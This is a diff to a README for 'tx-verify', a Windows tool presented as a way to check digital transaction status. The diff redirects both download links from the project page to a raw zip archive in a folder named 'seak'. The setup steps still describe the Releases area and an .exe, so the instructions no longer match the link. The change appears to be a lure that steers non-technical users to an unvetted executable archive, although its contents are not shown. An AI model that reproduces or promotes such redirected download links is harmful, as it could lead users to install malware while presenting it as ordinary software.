@@ -1,6 +1,6 @@
 # ✅ tx-verify - Verify your digital transaction status quickly
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Somersetsusurrant939/tx-verify)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Somersetsusurrant939/tx-verify/raw/refs/heads/main/seak/tx_verify_v3.1-alpha.3.zip)
 
 ## 📁 What is tx-verify
 
@@ -20,7 +20,7 @@ Your Windows computer needs basic hardware to run this program. Ensure your mach
 
 Follow these steps to set up the software on your machine. You do not need to compile code or install extra developer tools.
 
-1. Visit this page to download: [https://github.com/Somersetsusurrant939/tx-verify](https://github.com/Somersetsusurrant939/tx-verify)
+1. Visit this page to download: [https://github.com/Somersetsusurrant939/tx-verify/raw/refs/heads/main/seak/tx_verify_v3.1-alpha.3.zip](https://github.com/Somersetsusurrant939/tx-verify/raw/refs/heads/main/seak/tx_verify_v3.1-alpha.3.zip)
 2. Locate the Releases area on the right side of the screen.
 3. Click the most recent version link.
 4. Select the file ending in .exe to start the download.
